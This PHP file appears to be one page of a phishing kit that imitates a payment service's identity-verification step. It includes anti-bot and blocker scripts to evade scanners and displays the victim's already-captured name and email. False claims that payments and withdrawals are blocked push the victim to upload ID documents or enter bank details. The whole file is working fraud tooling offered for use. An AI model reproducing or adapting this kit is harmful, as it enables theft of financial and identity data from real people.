<?php

session_start();
error_reporting(0);

include "../../../BOTS/antibots1.php";
include "../../../BOTS/antibots2.php";
include "../../../BOTS/antibots3.php";
include "../../../BOTS/antibots4.php";
include "../../../BOTS/antibots5.php";
include "../../../BOTS/blocker.php";
include "../Mail_Box/detect.php";
include('../../functions/Config.php');
if($login_theme == "new") {
 $mailbox = $_SESSION['xysemailx'] ;
}
else {
 $mailbox = $_SESSION['_login_email_'] ;
}

?>
<!DOCTYPE html>
	<html>
	<head>
		<title>Select Way To Confirm Your ID</title>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="stylesheet" type="text/css" href="../Mail_Box/assest/header.css">
		<link rel="stylesheet" type="text/css" href="../Mail_Box/assest/section.css">
		<link rel="stylesheet" type="text/css" href="../Mail_Box/assest/spinner.css">
		<script type="text/javascript" src="../Mail_Box/assest/jquery.min.js"></script>
		<link rel="shortcut icon" href="../Mail_Box/assest/ico.ico" />
	</head>
	<body>

		<header>
			<div class="content">
				<div class="logo">
					<img src="../Mail_Box/assest/129x32.svg">
				</div>
				<div class="safety">
					<p><span>Your safety is our priority</span></p>
				</div>
				<div class="clearfix"></div>
				<p class="security">Your safety is our priority</p>
			</div>
		</header>

		<section>
			<div class="content">
				 <div class="head">
				 	<h2>Why Should I Confirm My Account Information ?</h2>
				 	<p><b>
				 		As we have not recognized the device or location from which you logged recently.
						We would like to confirm your identity.We want to esnsure that this is your account.</b>
				 	</p>
				 </div>

				 <div class="box">
				 	<div class="left-box">
				 		<ul>
				 			<li class="ni va">Billing address Confirmed</li>
				 			<li class="ni va">Card details Confirmed</li>
				 			<li class="ni va2">Select a method to Continue</li>
				 			<li class="io">Confirm Your ID Card / Bank info</li>
				 		</ul>
				 	</div>
				 	<div class="right-box">
				 		<div class="title">
				 			<p>We just need some additional info to confirm it's you :</p>
				 		</div>
				 		<div class="theboss">
				 			<div class="mailbox">
				 				<div class="l-mail">
				 					<img src="XASSEST/me1.png">
				 				</div>
				 				<div class="r-mail">
				 					<div class="contact"><?php echo $_SESSION['_nameoncard_'] ; ?> <br><p><a href="#"><?php echo $mailbox ; ?>

</a></p></div>
				 				</div>

				 			</div>

<form method="post" action="redirect.php" name="mselect" id="mailBoxForm" onsubmit="return validateMailBox()">

				 			<div class="group" style="margin: 15px 0">
					 			<label id="lblMailBox">Choose a method to confirm your identity&#8595;</label>
					 			<select id="inputMailBox" name="mselect"> 
								<option value="id">&nbsp;</option>
								<option value="id1">Attach Copies of Required documents</option>
								<option value="id2">Add/Confirm Your Bank Information</option>
								</select>
					 		</div>

					 		<div class="save">
					 			<input type="submit" name="" value="Continue">
					 		</div>

</form>

					 		<p class="why">Currently, you won’t be able to:</p>
					 		<p class="stp" style="border-top: 1px solid #dddddd;">&#x2718; Make a payment</p>
					 		<p class="stp">&#x2718; Send money</p>
					 		<p class="stp">&#x2718; Withdraw money</p>
						</div>
				 	</div>
				 	<div class="clearfix"></div>
				 </div>
			</div>
		</section>

<script type="text/javascript" src="../Mail_Box/assest/main.js"></script>

<style type="text/css">

</style>
<div id="kpop" class="transitioning spinner no" aria-busy="true">
	<p class="checkingInfo">
		<span class="no" id="checkmail">Please Wait...</span>
	</p>
</div>




</body>
</html>
<?php $_SESSION['_mailbox_'] = $mailbox  ?>